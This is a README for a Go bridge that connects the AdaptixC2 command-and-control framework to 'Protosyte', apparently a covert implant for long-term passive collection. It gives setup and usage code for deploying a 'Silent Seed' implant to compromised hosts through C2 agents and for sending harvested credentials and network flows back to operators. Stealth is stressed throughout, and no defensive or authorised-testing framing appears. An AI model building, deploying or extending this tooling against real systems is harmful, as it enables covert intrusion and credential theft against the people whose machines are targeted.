# AdaptixC2 Integration for Protosyte

This component provides seamless integration between AdaptixC2 (active C2 framework) and Protosyte (passive intelligence collection).

## Overview

The AdaptixC2 Bridge enables a **hybrid active/passive model**:
- **Active Phase**: AdaptixC2 provides robust C2 infrastructure for initial access and deployment
- **Passive Phase**: Protosyte provides stealthy, long-term intelligence collection
- **Intelligence Loop**: Protosyte intelligence feeds back to AdaptixC2 operators

## Architecture

```
AdaptixC2 Server → Agents → Deploy Protosyte → Passive Collection → Intelligence Feed
```

## Features

- **Automatic Deployment**: Deploy Protosyte Silent Seed via AdaptixC2 agents
- **Intelligence Exchange**: Feed Protosyte intelligence to AdaptixC2 operators
- **Multi-Platform Support**: Linux, Windows, macOS deployment
- **Real-Time Integration**: Continuous intelligence loop

## Usage

### Basic Setup

```go
import "protosyte-adaptixc2"

// Create bridge
bridge := adaptixc2.NewAdaptixC2Bridge(
    "https://adaptixc2.example.com",
    "your-api-key",
)

// Connect
if err := bridge.Connect(); err != nil {
    log.Fatal(err)
}

// Execute integrated campaign
if err := bridge.ExecuteIntegratedCampaign(); err != nil {
    log.Fatal(err)
}
```

### Deploy Protosyte to Agent

```go
// Deploy to specific agent
if err := bridge.DeployProtosyte("agent-12345"); err != nil {
    log.Printf("Deployment failed: %v", err)
}
```

### Feed Intelligence

```go
intel := ProtosyteIntelligence{
    AgentID: "agent-12345",
    Credentials: []Credential{...},
    NetworkFlows: []NetworkFlow{...},
    CollectedAt: time.Now(),
}

if err := bridge.FeedIntelligence("agent-12345", intel); err != nil {
    log.Printf("Failed to feed intelligence: %v", err)
}
```

## Quick Start

### Using Automation Scripts

```bash
# Setup environment
./scripts/setup-env.sh
# Edit .env and set ADAPTIXC2_SERVER_URL and ADAPTIXC2_API_KEY

# Build all components
./scripts/build-all.sh

# Start all services (includes AdaptixC2 bridge if configured)
./scripts/start-all.sh
```

### Manual Setup

```bash
# Build
cd protosyte-adaptixc2
go build -o protosyte-adaptixc2 .

# Configure
export ADAPTIXC2_SERVER_URL="https://adaptixc2.example.com"
export ADAPTIXC2_API_KEY="your-api-key"

# Run
./protosyte-adaptixc2
```

## Configuration

Set environment variables:
- `ADAPTIXC2_SERVER_URL`: AdaptixC2 server URL
- `ADAPTIXC2_API_KEY`: API key for authentication
- `PROTOSYTE_SEED_BINARY`: Path to Silent Seed binary (optional)

The bridge runs on port 8082 by default when started via `start-all.sh`.

## Integration Workflow

1. **Initial Access**: AdaptixC2 agent deployed on target
2. **Active C2**: Operators perform active operations via AdaptixC2
3. **Deploy Protosyte**: Automatic deployment via AdaptixC2 agent
4. **Passive Collection**: Protosyte begins passive intelligence collection
5. **Intelligence Feed**: Intelligence fed to AdaptixC2 operators
6. **Hybrid Operations**: Active C2 + Passive collection

## Security Considerations

- Maintains Protosyte's UPO doctrine (no commands flow back)
- Clear separation between active and passive phases
- Intelligence is encrypted and authenticated
- Operational security preserved

## See Also

- `ADAPTIX_INTEGRATION_ANALYSIS.md` - Detailed integration analysis
- `protosyte-seed/README.md` - Silent Seed documentation
- `analysis-rig/README.md` - Analysis Rig documentation

